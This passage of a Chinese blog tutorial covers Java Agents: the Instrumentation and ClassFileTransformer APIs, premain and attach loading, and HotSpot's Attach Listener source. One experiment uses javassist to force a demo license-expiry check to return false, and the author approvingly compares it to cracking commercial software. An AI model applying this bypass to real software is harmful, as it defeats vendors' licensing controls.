class="function">返回指定对象消耗的存储量的近似值。这个结果可能包括对象的部分或全部开销，因此对于在单独一个实现内进行比较是有用的，但对于实现之间的比较是没有用的。在JVM的单次调用中，估计值可能会改变。</span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span></span><br><span class="line"><span class="function">      指定一个JAR文件（包含插桩类），让它由Bootstrap加载器加载。</span></span><br><span class="line"><span class="function">      当虚拟机内置的类加载器（称为 "bootstrap class loader"）搜索某个类不成功时，JAR文件中的条目也会被搜索。</span></span><br><span class="line"><span class="function">本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。</span></span><br><span class="line"><span class="function">      Agent应该注意确保JAR文件中除了那些将由引导类加载器定义的类或资源，不包含任何其他类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为。例如，假设有一个加载器L，L的用于授权的父类是bootstrap类加载器。此外，L定义的类C中的一个方法引用了一个非公共的访问者类C$1，如果JAR文件中包含一个类C$1，那么授权给bootstrap类加载器将导致C$1被bootstrap类加载器定义。在这个例子中，一个IllegalAccessError将被抛出，可能会导致应用程序失败。避免这类问题的一个方法是为插桩类使用一个独特的包名。</span></span><br><span class="line"><span class="function">                       </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span></span></span><br><span class="line"><span class="function">      指定一个JAR文件（包含插桩类），让它由SystemClassLoader。</span></span><br><span class="line"><span class="function">      这里面的SystemClassLoader其实就是ApplicationClassLoader。</span></span><br><span class="line"><span class="function">      当委托的系统类加载器（参见<span class="title">getSystemClassLoader</span><span class="params">()</span>）搜索一个类不成功时，JarFile中的条目将被搜索。</span></span><br><span class="line"><span class="function">本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Agent应注意确保JAR中不包含除SystemClassLoader以外的任何类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为（参见appendToBootstrapClassLoaderSearch）。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">如果SystemClassLoader实现了一个名为appendToClassPathForInstrumentation的方法，那么它就支持添加一个要搜索的JAR文件，该方法接收一个类型为java.lang.String的单一参数。该方法不需要公开访问。JAR文件的名称是通过调用jarfile上的<span class="title">getName</span><span class="params">()</span>方法获得的，并作为参数提供给appendToClassPathForInstrumentation方法。</span></span><br><span class="line"><span class="function">此方法不会改变java.class.path系统属性的值。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isNativeMethodPrefixSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持设置本地方法前缀。设置本地方法前缀的能力是JVM的一个可选能力。</span></span><br><span class="line"><span class="function">      只有在代理 JAR 文件中 Can-Set-Native-Method-Prefix manifest 属性被设置为 <span class="keyword">true</span>（如包规范中所述）且 JVM 支持该能力时，才会支持设置本地方法前缀。</span></span><br><span class="line"><span class="function">      在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer,String prefix)</span></span></span><br><span class="line"><span class="function">      设置<span class="keyword">native</span> method 前缀</span></span><br></pre></td></tr></table></figure><h1 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h1><p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。</p><p>可以使用<code>addTransformer</code>注册一个我们自定义的<code>Transformer</code>到<code>Java Agent</code>，当有新的类被<code>JVM</code>加载时<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，==可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后将新的类字节码返回给<code>JVM</code>==，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p><p>继续读JavaDoc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">通常，一个Agent提供了这个接口的实现，以便转换类文件。转换发生在JVM定义类之前。</span><br><span class="line">请注意，类文件这个术语在Java™虚拟机规范第<span class="number">3.1</span>节中定义，指的是类文件格式的字节序列，无论它们是否驻留在文件中。</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">byte</span>[] transform(ClassLoader loader,</span><br><span class="line">                 String className,</span><br><span class="line">                 Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                 ProtectionDomain protectionDomain,</span><br><span class="line">                 <span class="keyword">byte</span>[] classfileBuffer)</span><br><span class="line">          <span class="keyword">throws</span> IllegalClassFormatException</span><br><span class="line"></span><br><span class="line">该方法的实现可以对提供的类文件进行转换，并返回一个新的替换类文件。</span><br><span class="line">  一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。能够重构的变换器也会在每次类重构时被调用。</span><br><span class="line">  新类定义的请求是通过ClassLoader.defineClass或其原生等价物来实现的。</span><br><span class="line">  对类的redefinition的请求是通过Instrumentation.redefineClasses或它的本机等价物提出的。</span><br><span class="line">  类的retransformation请求由 Instrumentation.retransformClasses 或其本机等价物发出。</span><br><span class="line">  在请求的处理过程中，在类文件字节被验证或应用之前，Transformer被调用。</span><br><span class="line">  当有多个Transformer时，Transformer是通过链式变换调用组成的。也就是说，一次变换调用返回的字节数组成为下一次调用的输入（通过classfileBuffer参数）。</span><br><span class="line">  </span><br><span class="line">  对于retransformation，不能重构的变换器不被调用，而是重用之前变换的结果。在所有其他情况下，这个方法都会被调用。在这些分组中，transformers按照注册的顺序被调用。原生变换器由Java虚拟机工具接口中的ClassFileLoadHook事件提供。</span><br><span class="line">  参数：</span><br><span class="line">  loader              定义要转换的类加载器；如果是引导加载器，则为 <span class="keyword">null</span></span><br><span class="line">className           类名,如:java/lang/Runtime</span><br><span class="line">  classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 <span class="keyword">null</span></span><br><span class="line">  protectionDomain    要定义或重定义的类的保护域</span><br><span class="line">  classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> 字节码<span class="keyword">byte</span>数组</span><br></pre></td></tr></table></figure><p><strong>重写<code>transform</code>方法需要注意以下事项：</strong></p><ol><li><code>ClassLoader</code>如果是被<code>Bootstrap ClassLoader(引导类加载器)</code>所加载那么<code>loader</code>参数的值是空。</li><li>修改类字节码时需要特别注意插入的代码在对应的<code>ClassLoader</code>中可以正确的获取到，否则会报<code>ClassNotFoundException</code>，比如修改<code>java.io.FileInputStream(该类由Bootstrap ClassLoader加载)</code>时插入了我们检测代码，那么我们将必须保证<code>FileInputStream</code>能够获取到我们的检测代码类。</li><li><code>JVM</code>类名的书写方式路径方式：<code>java/lang/String</code> 而不是我们常用的类名方式：<code>java.lang.String</code>。</li><li>类字节必须符合<code>JVM</code>校验要求，如果无法验证类字节码会导致<code>JVM</code>崩溃或者<code>VerifyError(类验证错误)</code>。</li><li>如果修改的是<code>retransform</code>类(修改已被<code>JVM</code>加载的类)，修改后的类字节码不得<code>新增方法</code>、<code>修改方法参数</code>、<code>类成员变量</code>。</li><li><code>addTransformer</code>时如果没有传入<code>retransform</code>参数(默认是<code>false</code>)就算<code>MANIFEST.MF</code>中配置了<code>Can-Redefine-Classes: true</code>而且手动调用了<code>retransformClasses</code>方法也一样无法<code>retransform</code>。一定要增加true参数！！！</li><li>卸载<code>transform</code>时需要使用创建时的<code>Instrumentation</code>实例。</li></ol><p>Java Agent还限制了我们：</p><ol><li>必须以jar包的形式运行或加载；</li><li>必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（启动前Agent模式）或<code>Agent-Class:</code>（运行中Agent模式）配置；</li><li>如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</li></ol><h1 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h1><p>接下来进行实验，启动前<code>premain+-javaagent</code>以及启动中<code>Attach</code> 两种模式。</p><h2 id="启动前指定Agent位置"><a href="#启动前指定Agent位置" class="headerlink" title="启动前指定Agent位置"></a>启动前指定Agent位置</h2><p>如果需要在目标JVM启动的同时加载Agent，实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。</p><h3 id="实战一：premain方法测试"><a href="#实战一：premain方法测试" class="headerlink" title="实战一：premain方法测试"></a>实战一：premain方法测试</h3><p>写一个demo做个实验：</p><p>创建Agent类，声明premain方法：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201222948010.png" alt="image-20210201222948010"></p><p>使用maven-jar-plugin，创建MANIFEST.MF：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223255740.png" alt="image-20210201223255740"></p><p>MANIFEST.MF：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223426121.png" alt="image-20210201223426121"></p><p><code>mvn clean install</code>生成jar包：<code>java_agent_01-1.0-SNAPSHOT</code></p><p>待插桩类：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223908739.png" alt="image-20210201223908739"></p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223920391.png" alt="image-20210201223920391"></p><p>同样打包，<code>example01-1.0-SNAPSHOT</code>：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201223953455.png" alt="image-20210201223953455"></p><p>终端执行，成功插桩：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210201224546368.png" alt="image-20210201224546368"></p><h3 id="实战二：打印加载的类"><a href="#实战二：打印加载的类" class="headerlink" title="实战二：打印加载的类"></a>实战二：打印加载的类</h3><p>之前也提到，一旦你addTransformer之后，需要加载的每一个类都会经过transform方法。</p><p>一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。</p><p>首先addTranformer：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209211836621.png" alt="image-20210209211836621"></p><p>这里ClassFileTransformerDemo()继承了ClassFileTransformer类，记得最后加上ture：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209212017484.png" alt="image-20210209212017484"></p><p>这里就是简单的执行了打印在Tranformer之后加载的类：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209212111604.png" alt="image-20210209212111604"></p><h3 id="实战三：代码插桩"><a href="#实战三：代码插桩" class="headerlink" title="实战三：代码插桩"></a>实战三：代码插桩</h3><p>这里复现一下<a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open" target="_blank" rel="noopener">yz</a>的实验。这个例子写得很好，类似于破解官方软件的一种绕过过程，毕竟白嫖才是最香的。</p><p>首先这里有一个校验函数用来判断用户是否已经过了有效期，这个截止日期是硬编码在代码中的，由于是写死的那么就会一直提示已经过期：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckLicense</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SimpleDateFormat DATE_FORMAT = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkExpiry</span><span class="params">(String expireDate)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Date date = DATE_FORMAT.parse(expireDate);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检测当前系统时间早于License授权截至时间</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> Date().before(date)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 设置一个已经过期的License时间</span></span><br><span class="line">        <span class="keyword">final</span> String expireDate = <span class="string">"2020-10-01 00:00:00"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        String time = <span class="string">"["</span> + DATE_FORMAT.format(<span class="keyword">new</span> Date()) + <span class="string">"] "</span>;</span><br><span class="line">                        <span class="comment">// 检测license是否已经过期</span></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (checkExpiry(expireDate)) &#123;</span><br><span class="line">                                System.err.println(time + <span class="string">"您的授权已过期，请重新购买授权！"</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                System.out.println(time + <span class="string">"您的授权正常，截止时间为："</span> + expireDate);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// sleep 1秒</span></span><br><span class="line">                        TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>硬编码有效期是一个已经过期的License时间<code>final String expireDate = &quot;2020-10-01 00:00:00&quot;;</code></p><p>已经过期：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210209231744276.png" alt="image-20210209231744276"></p><p>这里开始编写Agent：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassFileTransformerDemo</span>  <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要被Hook的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String HOOK_CLASS = <span class="string">"com.sec.CheckLicense"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将目录路径替换成Java类名</span></span><br><span class="line">        String cn = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只处理HOOK_CLASS类的字节码</span></span><br><span class="line">        <span class="keyword">if</span> (cn.equals(HOOK_CLASS)) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(cn);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用javassist将类二进制解析成CtClass对象</span></span><br><span class="line">                CtClass ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx)</span></span><br><span class="line">                CtMethod ctMethod = ctClass.getDeclaredMethod(</span><br><span class="line">                        <span class="string">"checkExpiry"</span>, <span class="keyword">new</span> CtClass[]&#123;classPool.getCtClass(<span class="string">"java.lang.String"</span>)&#125;</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 在checkExpiry方法执行前插入输出License到期时间代码</span></span><br><span class="line">                ctMethod.insertBefore(<span class="string">"System.out.println(\"License到期时间：\" + $1);"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 修改checkExpiry方法的返回值，将授权过期改为未过期</span></span><br><span class="line">                ctMethod.insertAfter(<span class="string">"return false;"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 修改后的类字节码</span></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里相当于将检测日期函数写死return false。</p><p>打包，运行：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210034102611.png" alt="image-20210210034102611"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>MANIFEST.MF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/DEPENDENCIES<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/LICENSE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/NOTICE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>org.javassist:javassist:jar:*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">&lt;!-- 修改第三方依赖包名称 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">relocations</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">shadedPattern</span>&gt;</span>com.fxc.deps.javassist<span class="tag">&lt;/<span class="name">shadedPattern</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">relocations</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="启动中进行Agent-Attach"><a href="#启动中进行Agent-Attach" class="headerlink" title="启动中进行Agent Attach"></a>启动中进行Agent Attach</h2><p>之前的<code>permain</code>方法只能在java程序启动之前执行，而Java SE 6的新特性改变了这种情况，可以通过Java Tool API中的attach方式来达到这种程序启动之后设置代理的效果。</p><p>下面来分析一下动态加载Agent的相关技术细节。</p><h3 id="AttachListener"><a href="#AttachListener" class="headerlink" title="AttachListener"></a>AttachListener</h3><p>Attach机制通过Attach Listener线程来进行相关事务的处理，下面来看一下Attach Listener线程是如何初始化的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Starts the Attach Listener thread</span></span><br><span class="line"><span class="comment">//创建AttachListener线程</span></span><br><span class="line"><span class="keyword">void</span> AttachListener::init() &#123;</span><br><span class="line">  <span class="comment">// 创建线程相关部分代码被去掉了</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> thread_name[] = <span class="string">"Attach Listener"</span>;</span><br><span class="line">  Handle <span class="built_in">string</span> = java_lang_String::create_from_str(thread_name, THREAD);</span><br><span class="line">  &#123; <span class="function">MutexLocker <span class="title">mu</span><span class="params">(Threads_lock)</span></span>;</span><br><span class="line">    JavaThread* listener_thread = <span class="keyword">new</span> JavaThread(&amp;attach_listener_thread_entry);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个线程启动之后都需要指定一个入口来执行代码，Attach Listener线程的入口是attach_listener_thread_entry，下面看一下这个函数的具体实现：</p><p>下面看attach_listener_thread_entry的具体实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">attach_listener_thread_entry</span><span class="params">(JavaThread* thread, TRAPS)</span> </span>&#123;</span><br><span class="line">  AttachListener::set_initialized();</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span 